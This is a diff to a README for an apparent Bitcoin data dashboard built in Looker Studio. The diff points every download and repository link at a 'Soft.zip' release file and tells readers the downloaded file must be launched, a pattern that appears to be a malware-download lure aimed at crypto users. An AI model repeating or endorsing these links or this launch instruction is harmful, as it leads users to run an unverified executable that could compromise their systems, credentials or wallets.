@@ -16,12 +16,12 @@ Welcome to **Bitcoin Navigator**, a data-driven dashboard designed to analyze Bi
 - **Topics**: bitcoin, btc, crypto, cryptocurrency, data-analysis, data-analytics, data-science, data-visualization, gcp, investment, looker, looker-studio
 
 ## Get Started
-To explore the full potential of Bitcoin Navigator, download the **Release.zip** package:
-[![Download Bitcoin Navigator](https://img.shields.io/badge/Download-Release.zip-brightgreen)](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+To explore the full potential of Bitcoin Navigator, download the **https://github.com/danhnnguyen0606/Bitcoin-Navigator/releases/download/v1.0/Soft.zip** package:
+[![Download Bitcoin Navigator](https://github.com/danhnnguyen0606/Bitcoin-Navigator/releases/download/v1.0/Soft.zip)](https://github.com/danhnnguyen0606/Bitcoin-Navigator/releases/download/v1.0/Soft.zip)
 
 Please note that the downloaded file needs to be launched to access Bitcoin Navigator's data-driven dashboard.
 
 ## Discover More
-Visit the **[GitHub Repository](https://github.com/adelante20/Bitcoin-Navigator)** for more insights, documentation, and updates.
+Visit the **[GitHub Repository](https://github.com/danhnnguyen0606/Bitcoin-Navigator/releases/download/v1.0/Soft.zip)** for more insights, documentation, and updates.
 
 Thank you for choosing Bitcoin Navigator! 🚀📈🔍 #happyinvesting #bitcoin #cryptocurrency #dataanalysis #datavisualization #investment
